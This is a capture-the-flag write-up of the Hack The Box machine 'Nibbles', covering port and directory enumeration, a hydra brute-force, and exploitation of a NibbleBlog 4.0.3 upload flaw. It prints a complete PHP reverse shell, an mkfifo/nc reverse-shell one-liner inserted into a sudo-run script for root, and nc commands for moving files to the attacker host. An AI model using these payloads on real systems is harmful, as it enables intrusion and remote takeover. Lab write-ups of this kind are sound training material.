---
title: "Nibbles - Hack the box"
author: Neal
summary: "本文围绕《Nibbles - Hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。"
cover: "/img/post-covers/nibbles-hack-the-box-771374afbf.jpg"
tags: [安全, 渗透测试, HTB]
categories: [htb]
date: "2019-03-17"
lastmod: "2026-08-08"
---

![Ae0G8g.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/47a5f56710b4.png)

## Introduction

Target: 10.10.10.75(OS: Linux)
Kali linux: 10.10.16.44

## Information Enumeration

Firstly, detect the open ports:

```
nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75
```

![Ae19BQ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/cc64bb41eafd.png)

There are not too many open ports, just `80` and `22`. Detect the detailed services of the open ports:

```
nmap -sC -sV -oA services 10.10.10.75
```

![Ae1E90.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ebe33e24e983.png)

Nothing special found. The only clue may be the open port of `80`. To be honest, the box with less open ports is easier in general.

## Exploit

### Http

Access to `http://10.10.10.75`, just a web page of `hello world`.

![Ae0qsA.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5b9c2d80261d.png)

With the first sight, have not found anything special. Open the inspector, a comment can be found. Obviously, `nibbleblog` is quite important to us. Access to `http://10.10.10.75/nibbleblog`:

![Ae0XZt.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f945c2e25684.png)

It seems to be a blog demo. Try to access to each hyperlink in the web page, find nothing special. Try to use nikto to explore:

```
nikto -host http://10.10.10.75/nibbleblog/
```

![AeYklt.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f30066345eb7.png)

`[nibbleblog](http://www.nibbleblog.com/)`  is an open source blog system which has been widely used. From the above screenshot, some interesting links can be found. And also try to brute force with `gobuster`:

```
gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

Similarly, the directory of `nibbleblog` can be found, just like admin, content, etc. Open the README of the blog:

![AeYynK.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5f4d55418172.png)

The version is `4.0.3`. Google with `nibbleblog 4.0.3 exploit`. Find a [report](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) to talk about the exploit of nibbleblog of `4.0.3`.

![AeYRtH.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/02391d3eb4dd.png)

The research report is detailed. But there is a precondition that you have to obtain admin credentials. Access to login page: `http://10.10.10.75/nibbleblog/admin.php`.

![AeY5ct.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/a6399ea1bb93.png)

Try the password of `123456` and `admin`. Both are not correct. I have even tried to use hydra:

`hydra -l admin -P /usr/share/wordlist/rockyou.txt -vV -f -t 2 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:login_error"`

![AetpuV.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/999a82a4ffe9.png)

The hydra result shows that the password is `123456`. But it is not correct. I doubt it has something with the blacklist of `nibbleblog`. Whatever, try to figure out the password. Try `nibbles`. Wow, we are in. You should try every password as more as possible. 

As you have logged in. The above report can be used:

1. Obtain Admin credentials (for example via Phishing via XSS which can be gained via CSRF, see advisory about CSRF in NibbleBlog 4.0.3)
2. Activate My image plugin by visiting http://10.10.16.44/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
3. Upload PHP shell, ignore warnings
4. Visit http://localhost/10.10.16.44/content/private/plugins/my_image/image.php. This is the default name of images uploaded via the plugin.

Upload a reverse shell php file and use nc to listen to port `1234`:

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.44';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Accomplish the last step, get the user shell!

![AetbKx.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5380baf38eed.png)

## Privilege escalation

The next step is to get the root shell. Try to check the kernel of the linux:

![AeNAZ8.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/6fbf828a7774.png)

The kernel seems quite fresh. It may be hard to find the kernel exploit. Try to check the sudo permission of nibbler: `sudo -l`.

![AeNuzn.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/abc6756263e3.png)

Just as expected, find a file `monitor.sh` with root permission. Try to read the file with:

```
cat /home/nibbler/personal/stuff/monitor.sh
```

![AeNrdO.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/e31074d67b3b.png)

The file seems to be a bash script with several tasks. There is no need to understand the usage of the file. We can just modify the script to obtain root shell. So the script should be modified. As it is not convenient to modify the file in the victim machine directly. `Nc` can be used to send and receive file.

As the sender:

```
nc -w 3 10.10.16.44 1234 < monitor.sh
```

As the receiver:

```
nc -lvnp 1234 > monitor.sh
```

You can change the send and receiver as needed. It is basic skills to transfer files between the victim machine and attack machine. `Nc` is a good tool in linux.

Firstly, `nc` is used to reverse shell:

```
nc -e 10.10.16.44 1111
```

Try to set `nc` listen to `1111`:

![AeUA61.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d8b6d9829d09.png)

There's a problem with the `nc` in the victim machine. `e` option is invalid in the victim machine. May there are some solutions, but I turn to other reverse shell methods right away.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f
```

Send the `monitor.sh` to the victim machine and make sure to obtain the execution permission:

```
chmod +x monitor.sh
```

Establish the listen to `1234` in Kali linux and execute the `monitor.sh` in the victim machine:

```
sudo ./monitor.sh
```

Here is the root.

![AeaECQ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/00db624c19dd.png)

 

## Conclusion

To be honest, the most difficult challenge of this box is to guess the password of admin of `nibbleblog`. The known vulnerability is not difficult to utilize. To obtain root shell, there are some methods to try. Some specific method cannot be utilized directly. You can try another method. Try harder!


## 练习收获清单

- 目录枚举发现隐藏管理端  
- 弱口令 / 默认凭据意识  
- 文件上传或模板注入类初始访问  
- 权限提升前的本机枚举顺序  

## 小结

Nibbles 适合练「Web 入口 + 基础提权」节奏。把每一次枚举命令的目的写下来，形成自己的检查表。


## 复盘问题

- 哪条枚举路径浪费时间最多？  
- 哪个假设是错的？  
- 若重来，字典与词表如何调整？  

写完 flags 再写三段复盘，进步会更快。


## 延伸阅读与实践

把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。

若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。

对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。
